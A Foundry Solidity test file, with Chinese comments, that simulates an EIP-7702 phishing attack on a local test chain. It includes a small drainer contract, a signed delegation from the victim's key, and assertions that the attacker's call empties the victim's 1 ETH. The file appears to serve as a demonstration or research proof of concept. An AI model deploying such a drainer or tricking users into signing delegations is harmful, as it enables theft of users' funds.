// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.29;

import  "../lib/forge-std/src/Test.sol";

contract MaliciousDelegate {
    function drain(address payable to) public {
        payable(to).transfer(address(this).balance);
    }
}

contract EIP7702PhishingAttackTest is Test {
    MaliciousDelegate maliciousDelegate;
    address user = address(0x12); // 用户地址
    address attacker = address(0x34); // 攻击者地址
    uint256 userPrivateKey = 0xxxxxx; // 用户私钥

    // 设置测试环境
    function setUp() public {

        maliciousDelegate = new MaliciousDelegate();
        

        vm.deal(user, 1 ether);
        
        vm.deal(attacker, 1 ether);
    }

    function testPhishingAttack() public {
        uint256 chainId = block.chainid;
        uint64 nonce = 0;
        
        console.log("user address: ", user);
        console.log("attacker address: ", attacker);
        console.log("malicious delegate address: ", address(maliciousDelegate));
        console.log("user balance: ", user.balance);
        console.log("attacker balance: ", attacker.balance);


        Vm.SignedDelegation memory signedDelegation = vm.signDelegation(address(maliciousDelegate), userPrivateKey, nonce);

        

        vm.attachDelegation(signedDelegation);
        
        bytes memory expectedCode = abi.encodePacked(hex"ef0100", address(maliciousDelegate));
        bytes memory userCode = user.code;
        assertEq(userCode, expectedCode, "User code is not correctly set to malicious delegate contract");

        uint256 attackerBalanceBefore = attacker.balance;
        vm.prank(attacker);
        (bool success, ) = user.call(
            abi.encodeWithSignature("drain(address)", attacker)
        );
        assertTrue(success, "call drain failed");
        


        uint256 attackerBalanceAfter = attacker.balance;
        assertEq(attackerBalanceAfter, attackerBalanceBefore + 1 ether, "attacker balance not increased");
        assertEq(user.balance, 0, "not all ETH drained from user account");
        console.log("========================");
        console.log("last user balance: ", user.balance);
        console.log("last attacker balance: ", attacker.balance);

    }
}